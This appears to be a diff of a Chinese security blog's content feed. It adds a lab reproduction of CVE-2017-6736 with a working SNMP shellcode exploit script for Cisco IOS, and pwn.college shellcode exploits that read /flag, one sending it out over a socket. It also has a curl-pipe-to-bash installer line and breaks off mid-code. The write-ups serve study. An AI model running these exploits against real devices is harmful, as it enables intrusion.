@@ -4217,10 +4217,10 @@ adb shell am monitor
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">选择多</td>
+<td align="center">选择多，但是arm调不动</td>
 <td align="center">使用方便</td>
-<td align="center">配置麻烦</td>
-<td align="center"><del>准备尝试</del>已配置，需要root，略麻烦</td>
+<td align="center"><del>配置麻烦，</del>多数时候没法用</td>
+<td align="center"><del>准备尝试</del> <del>已配置，需要root，略麻烦</del> 启动！</td>
 </tr>
 </tbody></table>
 <h5 id="1、Android-Studio"><a href="#1、Android-Studio" class="headerlink" title="1、Android Studio"></a>1、Android Studio</h5><p>在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：<img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230811134825647.png" alt="image-20230811134825647">armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢</p>
@@ -13061,6 +13061,29 @@ rip = frame.read_register(&quot;rip&quot;)
         rdx = frame.read_register(&quot;rdx&quot;)
     gdb.execute(&#39;c&#39;)
 </code></pre>
+<hr>
+<p>一些其他的tips：</p>
+<p>从AT&amp;T语法切换到intel语法：</p>
+<blockquote>
+<p>echo ‘set disassembly-flavor intel’ &gt; ~&#x2F;.gdbinit</p>
+</blockquote>
+<p>使用gdb自带的指令</p>
+<blockquote>
+<p>gdb -x script.gdb .&#x2F;file</p>
+<blockquote>
+<p>script.gdb</p>
+<p>条件断点，eg.在断点处打印$rax或执行一些需要的操作；类似idapython<code>print(get_reg_value(&#39;rax&#39;))</code></p>
+<pre><code>b *main
+commands
+    silent
+    p $rax
+    continue
+end
+r
+q
+</code></pre>
+</blockquote>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -13758,5 +13781,1450 @@ if __name__ == &quot;__main__&quot;:
 <pre><code>b0rn_t0_5truc7_b4by@flare-on.com
 </code></pre>
 <h6 id="总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）"><a href="#总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）" class="headerlink" title="总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）"></a>总结的话，就是第五个part，那里的shellcode最难（啥时候来补一下wp，鸽）</h6>]]></content>
+  </entry>
+  <entry>
+    <title>CVE-2017-6736</title>
+    <url>/2024/01/24/CVE-2017-6736/</url>
+    <content><![CDATA[<h6 id="PREFACE："><a href="#PREFACE：" class="headerlink" title="PREFACE："></a>PREFACE：</h6><span id="more"></span>
+
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>docker环境 (ubuntu 15)：</p>
+<pre><code class="shell">docker pull ubuntu:wily
+</code></pre>
+<pre><code>docker ps -a
+docker run --cap-add=NET_ADMIN --device=/dev/net/tun  -it ubuntu:wily /bin/bash
+</code></pre>
+<pre><code>apt install git
+</code></pre>
+<p>换源到旧版ubuntu：</p>
+<pre><code>sed -i &#39;s/archive/old-releases/g&#39; /etc/apt/sources.list
+apt update
+</code></pre>
+<p>编译模拟环境dynamips</p>
+<pre><code class="shell">apt-get install git
+git clone https://github.com/Groundworkstech/dynamips-gdb-mod.git
+
+cd dynamips-gdb-mod/src
+# 安装依赖
+apt-get install libpcap-dev uml-utilities libelf-dev libelf1
+
+# 这里需要修改配置文件
+cd /
+find . -name &quot;libelf.a&quot;
+# ./usr/lib/x86_64-linux-gnu/libelf.a
+vim Makefile
+</code></pre>
+<img src="/2024/01/24/CVE-2017-6736/image-20240124172328534.png" alt="image-20240124172328534" style="zoom:50%;">
+
+<img src="/2024/01/24/CVE-2017-6736/image-20240125085212819.png" alt="image-20240125085212819" style="zoom:50%;">
+
+<img src="/2024/01/24/CVE-2017-6736/image-20240125085538393.png" alt="image-20240125085538393" style="zoom:50%;">
+
+<p>配置网络</p>
+<pre><code class="shell">tunctl -t tap1 # 创建网络接口
+ifconfig tap1 up # 配置启用网络接口
+ifconfig tap1 192.168.199.139/24 up # 指定给tap1的IP地址和子网掩码
+
+# 删除
+ifconfig tap1 down
+tunctl -d tap1
+</code></pre>
+<p><img src="/2024/01/24/CVE-2017-6736/image-20240125092852258.png" alt="image-20240125092852258"></p>
+<p>运行</p>
+<pre><code class="shell">dynamips -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN
+</code></pre>
+<p>开启gdb server调试</p>
+<pre><code class="shell">dynamips -Z 12345 -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN
+</code></pre>
+<p>配置：</p>
+<pre><code>Would you like to enter the initial configuration dialog? [yes/no]:yes
+management network from the above interface summary: Ethernet0/0
+ip address 192.168.199.138 255.255.255.0
+</code></pre>
+<p>重新配置方法</p>
+<pre><code>rm c2600_*
+</code></pre>
+<pre><code class="shell">python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.199.254 public 12345678
+</code></pre>
+<p>c2800nm-adventerprisek9-mz.151-4.M12a.py</p>
+<pre><code class="python">from scapy.all import *
+from time import sleep
+from struct import pack, unpack
+import random
+import argparse
+import sys
+
+
+try:
+    cs = __import__(&#39;capstone&#39;)
+except ImportError:
+    pass
+
+def bin2oid(buf):
+    return &#39;&#39;.join([&#39;.&#39; + str(unpack(&#39;B&#39;,x)[0]) for x in buf])
+
+def shift(s, offset):
+    res = pack(&#39;&gt;I&#39;, unpack(&#39;&gt;I&#39;, s)[0] + offset)
+    return res
+
+
+
+alps_oid = &#39;1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125;&#123;7&#125;.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50&#123;8&#125;&#123;9&#125;.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115&#123;10&#125;&#123;11&#125;.11.187.147.166.116.171.114.126.109.248.144.111.30&#39;
+shellcode_start = &#39;\x80\x00\xf0\x00&#39;
+
+if __name__ == &#39;__main__&#39;:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;host&quot;, type=str, help=&quot;host IP&quot;)
+    parser.add_argument(&quot;community&quot;, type=str, help=&quot;community string&quot;)
+    parser.add_argument(&quot;shellcode&quot;, action=&#39;store&#39;, type=str, help=&#39;shellcode to run (in hex)&#39;)
+    args = parser.parse_args()
+
+
+    sh_buf = args.shellcode.replace(&#39; &#39;,&#39;&#39;).decode(&#39;hex&#39;)
+    print &#39;Writing shellcode to 0x&#123;&#125;&#39;.format(shellcode_start.encode(&#39;hex&#39;))
+    if &#39;capstone&#39; in sys.modules: 
+        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)
+
+    for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
+        s0 = bin2oid(sh_dword)  # shellcode dword
+        s1 = bin2oid(&#39;\x00\x00\x00\x00&#39;) 
+        s2 = bin2oid(&#39;\xBF\xC5\xB7\xDC&#39;)
+        s3 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        s4 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        s5 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        s6 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        ra = bin2oid(&#39;\xbf\xc2\x2f\x60&#39;) # return control flow jumping over 1 stack frame
+        s0_2 = bin2oid(shift(shellcode_start, k * 4))
+        ra_2 = bin2oid(&#39;\xbf\xc7\x08\x60&#39;)
+        s0_3 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        ra_3 = bin2oid(&#39;\xBF\xC3\x86\xA0&#39;)
+        
+        payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
+        
+        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
+
+        cur_addr = unpack(&quot;&gt;I&quot;,shift(shellcode_start, k * 4 + 0xa4))[0]
+        if &#39;capstone&#39; in sys.modules: 
+            for i in md.disasm(sh_dword, cur_addr):
+                color = &#39;green&#39;
+        else:
+            print(&quot;0x%x:\t%s&quot; %(cur_addr, sh_dword.encode(&#39;hex&#39;)))
+            
+        sleep(1)
+
+    ans = raw_input(&quot;Jump to shellcode? [yes]: &quot;)
+
+    if ans == &#39;yes&#39;:
+        ra = bin2oid(shift(shellcode_start, 0xa4)) # return control flow jumping over 1 stack frame
+        zero = bin2oid(&#39;\x00\x00\x00\x00&#39;)
+        payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
+        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
+        print &#39;Jump taken!&#39;
+</code></pre>
+<p>gdb连接</p>
+<pre><code class="shell">gdb-multiarch
+set architecture powerpc:MPC8XX
+set endian big
+</code></pre>
+<p>端口转发（这里用的wsl所以需要。。。）</p>
+<pre><code class="shell">socat -T 600 TCP-LISTEN:1234,fork,reuseaddr TCP:172.17.0.2:1234 &amp;
+</code></pre>
+<p>ida attach进去即可</p>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>参考资料：<a href="https://www.anquanke.com/post/id/98225">CVE-2017-6736 思科IOS系统远程代码执行漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pwnCollege</title>
+    <url>/2024/02/26/pwnCollege/</url>
+    <content><![CDATA[<p>assembly crash course level 26</p>
+<pre><code class="assembly">.section .text
+.global _start
+
+_start:
+    cmp $4, %rdi               # Compare rdi with 3
+    ja default_case            # If rdi &gt; 3, jump to default case
+
+    # Calculate jump address based on rdi value
+    lea (%rsi,%rdi,8), %rax    # rax = rsi + rdi*8 (address in jump table)
+    jmp (%rax)                # Indirect jump to the address stored at rax
+
+default_case:
+    lea 32(%rsi), %rax    # rax = rsi + rdi*8 (address in jump table)
+    jmp (%rax)                    # Jump to the default case address
+</code></pre>
+]]></content>
+  </entry>
+  <entry>
+    <title>flutter开发初探</title>
+    <url>/2024/03/28/flutter%E5%BC%80%E5%8F%91%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h6 id="PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）"><a href="#PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）" class="headerlink" title="PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）"></a>PREFACE：本意是练练手开发（<del>二进制实在看累了，顺便积累一点安卓</del>）</h6><span id="more"></span>
+
+<p>项目地址：<a href="https://github.com/DeMoYao100/woyao_app">DeMoYao100&#x2F;woyao_app (github.com)</a> 不定期更新（希望）</p>
+<p>环境配置：<a href="https://flutter.cn/docs">Flutter 开发文档 | Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a>，推荐vscode（出现过热重载问题，有实在看不出来的bug建议clean一下）</p>
+<p>环境搭建SDK issue：<a href="https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd">https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd</a></p>
+<p>一些遇到的问题写在注释里了，代码不长，目前就两千行，没咋写注释…</p>
+<p>配置签名和安卓一样，加icon注意一下版本问题</p>
+<blockquote>
+<p>flutter clean</p>
+<p>flutter pub get</p>
+<p>dart run flutter_launcher_icons:main</p>
+<p>flutter build apk –release</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>ubuntu python version manage</title>
+    <url>/2024/01/31/ubuntu-python-version-manage/</url>
+    <content><![CDATA[<pre><code class="shell">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \
+libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \
+libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl
+</code></pre>
+<pre><code class="shell">$ curl https://pyenv.run | bash
+</code></pre>
+]]></content>
+  </entry>
+  <entry>
+    <title>shellcodeORW</title>
+    <url>/2024/03/05/shellcodeORW/</url>
+    <content><![CDATA[<h6 id="PREFACE-pwn-college的shellcode-injection，算是一个小入门"><a href="#PREFACE-pwn-college的shellcode-injection，算是一个小入门" class="headerlink" title="PREFACE: pwn.college的shellcode injection，算是一个小入门~"></a>PREFACE: pwn.college的shellcode injection，算是一个小入门~</h6><span id="more"></span>
+
+<p>看了眼discord，不许开writeup，就隐藏了：&gt;</p>
+<!--
+### level 1
+
+basic orw：
+
+```python
+from pwn import *
+from string import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+// close:
+    mov rdi, 2
+    mov rax, 3
+    syscall
+
+// open:
+    mov rbx, 0x{flag_file}
+    mov rsi, 0
+    mov rdx, 0
+    push rbx
+    push rsp
+    pop rdi
+    mov rax, 2
+    syscall
+
+// read:
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    xor rax, rax
+    syscall
+
+// write:
+    mov rdx, rax
+    mov rdi, 1
+    mov rsi, rsp
+    mov rax, 1
+    syscall
+
+// exit:
+    mov rax, 0x3c
+    syscall
+'''
+hex_shellcode = asm(shellcode)
+# print(hex_shellcode)
+p = gdb.debug('./level1_chall','b *main + 560\nb *main + 709')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
+# p.send(hex_shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 2
+
+随机跳一段，全nop即可
+
+```python
+from pwn import *
+from string import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+// close:
+    mov rdi, 2
+    mov rax, 3
+    syscall
+
+// open:
+    mov rbx, 0x{flag_file}
+    mov rsi, 0
+    mov rdx, 0
+    push rbx
+    push rsp
+    pop rdi
+    mov rax, 2
+    syscall
+
+// read:
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    xor rax, rax
+    syscall
+
+// write:
+    mov rdx, rax
+    mov rdi, 1
+    mov rsi, rsp
+    mov rax, 1
+    syscall
+
+// exit:
+    mov rax, 0x3c
+    syscall
+'''
+hex_shellcode = asm(shellcode)
+# print(hex_shellcode)
+p = gdb.debug('./level2_chall','b *main + 910')
+# while (True):
+#     p = process('./level2_chall')
+#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
+#     # p.send(hex_shellcode + b'\n')
+#     print(p.recv())
+#     if (b'flag' in p.recv()):
+#         print(p.recv())
+#         break
+#     p.close()
+p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 3
+
+禁用`\x00`
+
+```python
+from pwn import *
+from string import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+// close:
+    xor rdx, rdx
+    xor rdi, rdi
+    xor rax, rax
+    mov dil, 2
+    mov al, 3
+    syscall
+
+// open:
+    xor rsi, rsi
+    xor rdx, rdx
+    sub rsp, 5
+    mov byte ptr [rsp], 0x2f
+    mov byte ptr [rsp+1], 0x66
+    mov byte ptr [rsp+2], 0x6c
+    mov byte ptr [rsp+3], 0x61
+    mov byte ptr [rsp+4], 0x67
+    mov byte ptr [rsp+5], 0x01
+    sub byte ptr [rsp+5], 0x01
+    push rsp
+    pop rdi
+    mov al, 2
+    syscall
+
+// read:    
+    mov rdi, rax
+    mov rsi, rsp
+    mov dl, 0x50
+    xor rax, rax
+    syscall
+
+// write:
+    mov rdx, rax
+    mov al, 1
+    push rax
+    pop rdi
+    mov rsi, rsp
+    mov al, 1
+    syscall
+// exit:
+    mov al, 0x3c
+    syscall
+'''
+hex_shellcode = asm(shellcode)
+# print(hex_shellcode)
+p = gdb.debug('./level2_chall','b *main + 910')
+# while (True):
+#     p = process('./level2_chall')
+#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
+#     # p.send(hex_shellcode + b'\n')
+#     print(p.recv())
+#     if (b'flag' in p.recv()):
+#         print(p.recv())
+#         break
+#     p.close()
+p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 4
+
+ban 'H'，不能用xor和mov等，用push pop代替赋值即可
+
+```python
+from pwn import *
+from string import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+// close:
+    push 0
+    pop rdx
+    push 0
+    pop rdi
+    push 0
+    pop rdx
+    mov dil, 2
+    mov al, 3
+    syscall
+    nop
+    
+// open:
+    push 0
+    pop rsi
+    push 0
+    pop rdx
+    nop
+    push 0
+    push 0
+    push 0
+    push 0
+    push 0
+    nop
+    mov byte ptr [rsp], 0x2f
+    mov byte ptr [rsp+1], 0x66
+    mov byte ptr [rsp+2], 0x6c
+    mov byte ptr [rsp+3], 0x61
+    mov byte ptr [rsp+4], 0x67
+    mov byte ptr [rsp+5], 0x01
+    sub byte ptr [rsp+5], 0x01
+    push rsp
+    pop rdi
+    mov al, 2
+    syscall
+    nop
+// read:    
+    push rax
+    pop rdi
+    push rsp
+    pop rsi
+    mov dl, 0x50
+    push 0
+    pop rax
+    syscall
+    nop
+// write:
+    push rax
+    pop rdx
+    mov al, 1
+    push rax
+    pop rdi
+    push rsp
+    pop rsi
+    mov al, 1
+    syscall
+// exit:
+    mov al, 0x3c
+    syscall
+'''
+hex_shellcode = asm(shellcode)
+# print(hex_shellcode)
+# p = gdb.debug('./level2_chall','b *main + 910')
+p = process('/challenge/babyshell_level4')
+# while (True):
+#     p = process('./level2_chall')
+#     p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\90' + hex_shellcode + b'\n')
+#     # p.send(hex_shellcode + b'\n')
+#     print(p.recv())
+#     if (b'flag' in p.recv()):
+#         print(p.recv())
+#         break
+#     p.close()
+p.sendafter('Reading 0x1000 bytes from stdin.\n',0x700 * b'\x90' + hex_shellcode + b'\n')
+p.interactive()
+# p.recv()
+```
+
+
+
+### level 5
+
+ban syscall等，得smc拿（代码写复杂了，可以直接获取rip的，不过一时没想起来就用了他的leak来找地址）
+
+```python
+from pwn import *
+from string import *
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+
+# p = gdb.debug('./level5_chall','b *main\nb *main + 873')
+p = process('./level5_chall')
+p.recvuntil('[LEAK] Mapping shellcode memory at ')
+leak_addr = p.recvn(10).decode()
+leak_addr = int(leak_addr, 16)
+
+# close
+shellcode = b''
+shellcode_close = '''
+    xor rdi, rdi
+    xor rdx, rdx
+    xor rax, rax
+    xor rsi,rsi
+    mov dil, 2
+    mov al, 3
+'''
+shellcode_close = asm(shellcode_close)
+shellcode += shellcode_close
+syscall = '''
+    syscall
+'''
+syscall = asm(syscall)
+after_syscall = bytes(a ^ b for a,b in zip(b'\x90\x90', syscall))
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# open
+shellcode_open = '''
+    mov al, 2
+    xor rdx, rdx
+    xor rsi, rsi
+    mov rbx, 0x0067616c662f
+    push rbx
+    push rsp
+    pop rdi
+'''
+shellcode_open = asm(shellcode_open)
+shellcode += shellcode_open
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# read
+shellcode_read = '''
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov al, 0
+'''
+shellcode_read = asm(shellcode_read)
+shellcode += shellcode_read
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# write
+shellcode_write = '''
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, rax
+    mov al, 1
+'''
+shellcode_write = asm(shellcode_write)
+shellcode += shellcode_write
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+shellcode_exit = '''
+    mov rax, 60
+'''
+shellcode_exit = asm(shellcode_exit)
+shellcode += shellcode_exit
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+# print('--------------------------------------')
+# print(disasm(shellcode))
+# print('--------------------------------------')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 6
+
+比起上一题多了禁用前0x1000的write，不过长度够可以直接绕
+
+```
+.rept 0x1000
+    nop
+.endr
+```
+
+```python
+from pwn import *
+from string import *
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'],log_level='debug')
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+
+p = gdb.debug('./level6_chall','b *main\nb *main + 957\nb *main + 525')
+# p = process('./level6_chall')
+p.recvuntil('[LEAK] Mapping shellcode memory at ')
+leak_addr = p.recvn(10).decode()
+leak_addr = int(leak_addr, 16)
+
+# close
+shellcode = '''
+.rept 0x1000
+nop
+.endr
+'''
+shellcode = asm(shellcode)
+shellcode_close = '''
+    xor rdi, rdi
+    xor rdx, rdx
+    xor rax, rax
+    xor rsi,rsi
+    mov dil, 2
+    mov al, 3
+'''
+shellcode_close = asm(shellcode_close)
+shellcode += shellcode_close
+syscall = '''
+    syscall
+'''
+syscall = asm(syscall)
+after_syscall = bytes(a ^ b for a,b in zip(b'\x90\x90', syscall))
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# open
+shellcode_open = '''
+    mov al, 2
+    xor rdx, rdx
+    xor rsi, rsi
+    mov rbx, 0x0067616c662f
+    push rbx
+    push rsp
+    pop rdi
+'''
+shellcode_open = asm(shellcode_open)
+shellcode += shellcode_open
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# read
+shellcode_read = '''
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x100
+    mov al, 0
+'''
+shellcode_read = asm(shellcode_read)
+shellcode += shellcode_read
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+# write
+shellcode_write = '''
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, rax
+    mov al, 1
+'''
+shellcode_write = asm(shellcode_write)
+shellcode += shellcode_write
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+
+shellcode_exit = '''
+    mov rax, 60
+'''
+shellcode_exit = asm(shellcode_exit)
+shellcode += shellcode_exit
+syscall = f'''
+    mov rbx, {leak_addr + len(shellcode) + 14}
+    xor byte ptr [rbx], {after_syscall[0]}
+    xor byte ptr [rbx+1], {after_syscall[1]}
+    nop
+    nop
+'''
+shellcode += asm(syscall)
+p.sendafter('Reading 0x2000 bytes from stdin.\n',shellcode + b'\n')
+# h = p.recv(0x2000)
+# print(h)
+p.interactive()
+```
+
+
+
+### level 7
+
+ban stdin stdout stderr，这里用socket来传
+
+开server接：
+
+```python
+import socket
+
+def start_server(host='0.0.0.0', port=5678):
+    while(True):
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        server_socket.bind((host, port))
+
+        server_socket.listen(5)
+        print(f"Listening on {host}:{port}...")
+
+        client_socket, addr = server_socket.accept()
+        print(f"Accepted a connection from {addr}")
+
+        data = client_socket.recv(1024)
+        print("Received data:", data.decode())
+
+        client_socket.close()
+        server_socket.close()
+
+if __name__ == "__main__":
+    start_server()
+```
+
+exp:
+
+``` python
+from pwn import *
+from string import *
+context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+
+# p = gdb.debug('./level6_chall','b *main\nb *main + 957\nb *main + 525')
+p = process('/challenge/babyshell_level7')
+p.recvuntil('Mapped 0x4000 bytes for shellcode at ')
+leak_addr = p.recvn(10).decode()
+leak_addr = int(leak_addr, 16)
+shellcode = '''
+// socket:
+    mov rdi, 2
+    mov rsi, 1
+    xor rdx, rdx
+    mov rax, 41
+    syscall
+
+    mov rdi, rax
+    mov r9, rax
+
+//  socket addr preparation
+    sub rsp, 4
+    mov word ptr [rsp + 0], 2
+    mov word ptr [rsp + 2], 0x2e16
+    mov dword ptr [rsp + 4], 0x0100007f
+
+    push rsp
+    pop rsi
+
+//  connect
+    mov rdx, 16
+    mov rax, 42
+    syscall
+
+//    mov rcx, rax // socket descriptor
+    mov rcx, rdi
+
+// close:
+    mov rdi, 2
+    mov rax, 3
+    syscall
+
+// open:
+    mov rbx, 0x0067616c662f
+    mov rsi, 0
+    mov rdx, 0
+    push rbx
+    push rsp
+    pop rdi
+    mov rax, 2
+    syscall
+
+// read:
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    xor rax, rax
+    syscall
+
+
+// write:
+    mov rdx, rax
+    xor rdi, rdi
+    mov rdi, r9
+    mov rsi, rsp
+    mov rax, 1
+    syscall
+
+    mov rdi, rax
+    mov rax, 3
+    syscall
+
+// exit
+    mov rax, 59
+    syscall
+'''
+shellcode = asm(shellcode)
+p.sendafter('Reading 0x4000 bytes from stdin.\n',shellcode + b'\n')
+# h = p.recv(0x2000)
+# print(h)
+p.interactive()
+```
+
+
+
+### level 8
+
+0x12 bytes，用的是chmod('file',7)，`ln -s /flag f`软链接到f上来节约字符
+
+```
+.intel_syntax noprefix
+.text
+.globl _start
+_start:
+    mov al, 0x5a
+    mov sil, 7
+    push 0x66     
+    push rsp
+    pop rdi
+    syscall
+```
+
+> cat flag
+
+
+
+### level 9
+
+每十个会CC十个，那么写一个生成shellcode，使得超过10个的时候会加入一个jmp（注意不能用qword mov这种大于等于八字节的指令，算是这题隐性的ban list）：
+
+```python
+from pwn import *
+from string import *
+from random import *
+context(os='linux',arch='amd64')
+shellcode = f'''    mov rdi, 2
+    mov rax, 3
+    syscall
+    xor rsi, rsi
+    xor rdx, rdx
+    sub rsp, 5
+    mov byte ptr [rsp], 0x2f
+    mov byte ptr [rsp+1], 0x66
+    mov byte ptr [rsp+2], 0x6c
+    mov byte ptr [rsp+3], 0x61
+    mov byte ptr [rsp+4], 0x67
+    mov byte ptr [rsp+5], 0x01
+    sub byte ptr [rsp+5], 0x01
+    push rsp
+    pop rdi
+    mov al, 2
+    syscall
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    xor rax, rax
+    syscall
+    mov rdx, rax
+    mov dil, 1
+    mov rsi, rsp
+    mov al, 1
+    syscall
+    mov rax, 0x3c
+    syscall'''
+shellcode_list = shellcode.splitlines()
+# print(shellcode_list)
+shellcode_tmp = ''
+shellcode_len = 0
+shellcode_pad_flag = 0
+i = 0
+while (i < len(shellcode_list)):
+    # print(f'shellcode_tmp [{i}]: \n',shellcode_tmp)
+    if ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 1):
+        if (shellcode_len % 10 <= 8):
+            random_str = ''.join(choices(string.ascii_letters, k=4))
+            pad = -(shellcode_len % 10) + 8 + 10
+            shellcode_tmp += f"    jmp {random_str}\n    .rept {pad}\n    nop\n    .endr\n{random_str}:\n"
+            shellcode_len += pad + 2
+            shellcode_pad_flag = 0
+        else:
+            shellcode_pad_flag = 1
+            shellcode_len -= len(asm(shellcode_list[i - 1]))
+            tmp = shellcode_tmp.splitlines()
+            tmp = tmp[:-1]
+            shellcode_tmp = '\n'.join(tmp)
+            shellcode_tmp += '\n'
+            i -= 1
+        
